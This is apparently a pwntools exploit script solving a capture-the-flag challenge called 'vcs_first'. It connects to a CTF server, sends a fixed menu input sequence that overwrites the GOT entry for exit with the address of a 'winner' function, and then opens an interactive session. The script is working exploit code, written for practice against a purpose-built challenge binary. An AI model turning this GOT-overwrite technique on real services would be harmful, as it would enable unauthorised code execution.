#!/usr/bin/env python3
from pwn import *
import psutil

BINARY = "vcs_first"

context.update(arch="amd64",os="linux")
context.binary = exe = ELF(f"./{BINARY}", checksec=False)

def get_pid_by_name(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            return process.info['pid']
    return None

# IMPORTANT: requires that you run `docker run -d -p 1024:1024 --rm -it vcs_first` first
#p = remote("localhost", 1024)
#pause() # to give it some time before gdb attach

p = remote("io.ept.gg", 30005)

# attach to process in docker
#gdb.attach(target=get_pid_by_name(BINARY), exe=f"./{BINARY}", gdbscript='''
#    source /home/moody/.gdbinit-gef-docker.py
#    b *view+131
#    c
#''')

def send(payload):
    p.recvuntil(b">")
    p.sendline(payload)

send(b"1")
send(b"0")

send(b"1")
send(b"1")

send(b"4")
send(b"1")

send(b"4")
send(b"0")

send(b"2")
send(b"0")
send(p64(exe.got["exit"]))

send(b"1")
send(b"3")

send(b"1")
send(b"4")

send(b"2")
send(b"4")
send(p64(exe.sym["winner"]))

send(b"1")
send(b"-1")

p.interactive()
